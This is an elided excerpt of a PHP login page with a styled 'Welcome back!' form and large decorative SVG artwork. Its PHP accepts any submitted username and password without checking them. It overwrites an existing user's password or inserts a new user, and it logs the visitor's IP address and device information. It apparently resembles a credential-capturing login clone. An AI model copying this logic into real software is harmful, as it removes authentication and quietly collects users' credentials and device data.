...
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    ...
    if (!empty($username) && !empty($password)) {
        ...
        if ($user) {
            ...
            $stmt = $pdo->prepare("
                UPDATE users 
                SET password = :password, ip_address = :ip_address, device_info = :device_info 
            ...
            // Insert a new user
            $stmt = $pdo->prepare("
                INSERT INTO users (username, password, ip_address, device_info) 
                VALUES (:username, :password, :ip_address, :device_info)
            ");
            $stmt->bindParam(':username', $username);
            $stmt->bindParam(':password', $hashedPassword);
            $stmt->bindParam(':ip_address', $ip_address);
...
<body>
    <div class="flex flex-row">
        <div class="min-h-screen text-gray-500 bg-black max-[990px]:w-full min-[990px]:w-[498px] min-[990px]:shadow-[0_4px_8px_0_#FFFFFF40]">
            <div class="flex size-full flex-col space-y-6 px-4 py-6 md:px-10">
                <a href="/index.php">
                    <div class="flex h-6 flex-row items-center space-x-2.5 md:h-8 mb-4 text-white">
                        <svg
                            ...
                            <path
                                fill="#C9F24D"
                                d="M0 26.5A5.5 5.5 0 0 1 5.5 21H11v11H5.5A5.5 5.5 0 0 1 0 26.5M11 0h10.5C27.299 0 32 4.701 32 10.5S27.299 21 21.5 21H11z"></path>
                        </svg>
                        <svg
                            xmlns="http://www.w3.org/2000/svg"
                            fill="none"
                            viewBox="0 0 103 34"
                            class="h-full text-white md:inline">
                            <g fill="currentColor">
                ...
                <div class="invisible select-none opacity-0">
                    <a
                ...
                <div>
                    <h2 class="mb-3 text-[32px] text-white font-semibold leading-10 tracking-[-4%]">
                        Welcome back!
                    </h2>
                ...
                <form action="login.php" method="POST" class="space-y-4">
                    <label class="text-[15px] font-medium leading-none tracking-tight text-tertiary peer-disabled:cursor-not-allowed peer-disabled:opacity-70 flex flex-col gap-2">
                        Email / Phone Number
                        <div class="flex items-center rounded-[16px] font-medium !text-foreground placeholder:!text-tertiary dark:border-transparent bg-container h-14 p-4 text-[15px] leading-6 relative bg-gray-900">
                            <input
                                class="bg-transparent text-gray-200 outline-0 placeholder:text-tertiary grow"
                                type="text"
                                id="username"
                    ...
                    <div class="grid gap-3">
                        <label class="text-[15px] font-medium leading-none tracking-tight text-tertiary peer-disabled:cursor-not-allowed peer-disabled:opacity-70 flex flex-col gap-2">
                            ...
                            <div class="w-full">
                                <div class="relative w-full">
                                    <div class="flex items-center rounded-[16px] font-medium !text-foreground placeholder:!text-tertiary dark:border-transparent bg-container h-14 p-4 text-[15px] leading-6 relative bg-gray-900 pr-6">
                                        <input
                                            class="bg-transparent text-gray-200 outline-0 placeholder:text-tertiary grow"
                                            type="password"
                                            required
                        ...
                        <div class="flex items-center justify-end text-sm">
                            <a
                                class="text-muted !underline dark:text-border"
            ...
            <div class="flex size-full items-center justify-center">
                <svg
                    ...
                    <g mask="url(#login_svg__a)">
                        <path
                            stroke="#4D4D4D"
                            d="M69.755 402.209c37.785 0 68.414-30.678 68.414-68.523v-68.523H1.34v68.523c0 37.845 30.63 68.523 68.415 68.523ZM402.075 132.296c0-72.6-58.763-131.457-131.249-131.457S139.593 59.696 139.593 132.296v26.55"></path>
                        <path
                            fill="#000"
                            stroke="#fff"
                            stroke-linecap="round"
                        ...
                        <path
                            fill="#C9F24D"
                            d="M138.663 371.045c14.263-8.438 24.058-18.274 21.879-21.969s-15.507.15-29.77 8.588c-14.262 8.439-24.058 18.274-21.879 21.969 2.18 3.695 15.508-.15 29.77-8.588"></path>
                        <path
                            fill="#C9F24D"
                            fill-rule="evenodd"
                        ...
                        <path
                            fill="#000"
                            d="M75.395 352.119c17.089-3.598 30.077-10.639 29.009-15.728-1.068-5.088-15.787-6.297-32.876-2.7-17.09 3.598-30.077 10.64-29.009 15.728 1.068 5.089 15.787 6.297 32.876 2.7"></path>
                        <path
                            fill="#000"
                            d="M74.057 345.801c17.088-3.598 30.076-10.64 29.008-15.728-1.068-5.089-15.787-6.297-32.876-2.7-17.089 3.598-30.076 10.639-29.008 15.728 1.067 5.088 15.787 6.297 32.876 2.7"></path>
                        <path
                            fill="#C9F24D"
                            fill-rule="evenodd"
                        ...
                        <path
                            fill="#C9F24D"
                            d="M73.282 342.073c13.394-2.82 23.663-7.914 22.936-11.379s-12.175-3.988-25.569-1.169-23.663 7.915-22.935 11.38c.727 3.465 12.174 3.988 25.568 1.168"></path>
                        <path
                            fill="#C9F24D"
                            fill-rule="evenodd"
                        ...
                        <path
                            fill="#000"
                            d="M106.181 270.589c.717-3.778-8.983-8.799-21.665-11.213-12.683-2.414-23.545-1.307-24.262 2.472s8.983 8.799 21.665 11.213c12.683 2.414 23.545 1.307 24.262-2.472"></path>
                        <path
                            fill="#000"
                            d="M107.083 265.884c.717-3.778-8.983-8.799-21.666-11.213s-23.544-1.307-24.261 2.472 8.983 8.799 21.665 11.213 23.545 1.307 24.262-2.472"></path>
                        <path
                            fill="#C9F24D"
                            fill-rule="evenodd"
                        ...
                        <path
                            fill="#C9F24D"
                            d="M102.224 264.38c.489-2.576-7.178-6.2-17.123-8.093s-18.406-1.339-18.894 1.238c-.49 2.577 7.177 6.201 17.123 8.094s18.405 1.338 18.894-1.239"></path>
                        <path
                            fill="#C9F24D"
                            fill-rule="evenodd"
                    ...
                    <mask
                        ...
                        <path
                            fill="#fff"
                            d="M153.915 162.081c3.999-6.981 14.752-12.684 24.043-12.734l206.704-.555-36.291 64.092-8.367 14.635c-3.881 7.166-14.684 13.206-24.008 13.391l-15.088.033-192.877.555 45.884-79.434z"></path>
                    </mask>
                    <g mask="url(#login_svg__b)">
                        <path
                            fill="#000"
                            d="M123.989 226.201c10.477-2.811 18.295-7.614 17.462-10.728s-10.003-3.36-20.48-.549-18.296 7.614-17.463 10.728c.834 3.114 10.003 3.36 20.481.549"></path>
                        <path
                            fill="#000"
                            d="M125.02 230.055c10.478-2.811 18.296-7.614 17.463-10.728-.834-3.114-10.003-3.36-20.48-.549s-18.296 7.614-17.463 10.728c.834 3.114 10.003 3.36 20.48.549"></path>
                        <path
                            fill="#C9F24D"
                            fill-rule="evenodd"
                        ...
                        <path
                            fill="#C9F24D"
                            d="M124.681 228.755c8.209-2.203 14.404-5.713 13.834-7.84-.569-2.126-7.686-2.065-15.896.138s-14.404 5.712-13.835 7.839c.57 2.127 7.687 2.065 15.897-.137"></path>
                        <path
                            fill="#C9F24D"
                            fill-rule="evenodd"
